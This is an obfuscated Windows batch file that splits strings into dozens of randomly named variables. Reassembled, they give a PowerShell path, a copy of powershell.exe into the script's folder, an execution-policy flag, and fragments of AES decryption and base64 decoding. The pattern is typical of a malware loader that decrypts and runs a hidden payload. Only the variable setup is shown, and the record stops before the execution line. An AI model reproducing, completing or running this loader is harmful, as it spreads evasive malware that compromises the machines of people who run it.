@echo off
set "ykSLGldoYO=ow"
set "bGVcnMsxLf=we"
set "LEwwvZUszM=0\"
set "wjdGhCXErz=rs"
set "MaIiLhLVAi=st"
set "DVQScthDGt=1."
set "kJMnFzSMSO=ws"
set "KIyswUaOap=he"
set "KpVdnDNKZT=ll"
set "iogrXGIBik=:\"
set "YFrFcqHLSC=po"
set "UvwOIgYeni=s\"
set "zfHVJxtSuk=em"
set "sDHhuDuGKE=Wi"
set "ARsFqOBKyz=.e"
set "MvKegOtAJG=ll"
set "yfpFdghmiP=co"
set "jnnnhbyZzt= /"
set "ZQIQiWFXRp=do"
set "pQwMqLpqzj=rS"
set "IbmPDsIdbe=Sy"
set "huaMzTIcDe=\v"
set "JfPUQSmpbN=Po"
set "SPGdqTTITZ=nd"
set "ZpDQgXEkPM=he"
set "CanUcUNocA=\W"
set "JFlHMdIWuw= C"
set "zkGWuDXEYb=py"
set "jwVKYiXYAr=y "
set "ucDeIDurgg=in"
set "mXkVMOydaT=we"
set "VPuKqwXcin=32"
set "scutCWuuPO=xe"
set "eWgfkgxJPg= %~dp0"
set "enBhLFkaoh=cd"
set "gTuYoXcZBk= [st"
set "dnqVqhvcmN=Comp"
set "ZkGGKiUIdf=Bm.T"
set "gRcJGGaQGQ=($tv"
set "uEJHOXQSeo=fi ="
set "juKORAYZGf=.Cry"
set "dCFxpBDiOu=T = "
set "yvNAKWudgy=ss -"
set "dnJAOURdDD=dj0C"
set "NOYMViSYPw=BeRp"
set "TfYYGrlmgM=ddin"
set "NFXNcZzTkA=ddin"
set "xZPXlXYtgt=oryS"
set "NroDKhGJrF=e = "
set "FjQSkkdmRr=ew-O"
set "vqnVNGtgmj=y.Pa"
set "bUENERfnhd=Obje"
set "KIZKjfFMGb=eMVs"
set "QuBbrBPuvd=('Tg"
set "EzgMAtieQO=viBA"
set "lvcDNWMlCU=hy.A"
set "TXZRaDSKqG=yste"
set "lmUFhYmTEm=Bmor"
set "vebippHUjL=grap"
set "DtzLkWeHIL='txe"
set "kZqHsFRgda=File"
set "xHnmmfZePa=)($B"
set "aSsujecjsH=oin "
set "BjrdRyCEoL=yste"
set "TJcTyjkwRE=k; }"
set "DkBSbqFJon=Syst"
set "afDhPHKVmv=tem."
set "yKlkreTYsu=n ''"
set "nlDloRZEXR=y.Cr"
set "CDWogRgepY=raph"
set "xTGmDbztYw=]::("
set "ySkoXXOvFn=[Sys"
set "GBCqjIeKkf=.Cre"
set "cigLGghQBs=[Sys"
set "iqxQLnGTPA=.Sec"
set "gpxXSDjVEk=Obje"
set "heuGjKDLmz== $z"
set "bvSczPHPfE=-ep "
set "CuHEETVeFM=pB ="
set "zQRJTeNgow=$zvi"
set "SxvScTTptw=Comp"
set "xKwWxWPERT=ptog"
set "IqZFshrjQf=ode]"
set "cBYdZBwZTp=.Mem"
set "MyMlbiZGuM=rity"
set "ldPtzLZnsz=rity"
set "joVIFliZzI=in $"
set "tSUbQKTaCU=();$"
set "IMEVQnLWqv=::('"
set "hPIpGqLIGN=ypto"
set "ncVXsAfezJ=esMa"
set "dZhFIouwtt=stem"
set "CETYsEozLp=th('"
set "BrPhZWDkTh=m.Re"
set "ElPIzvweYz=]::("
set "GPwDKvsTbM=)))"
set "vwOqANRZSj=g = "
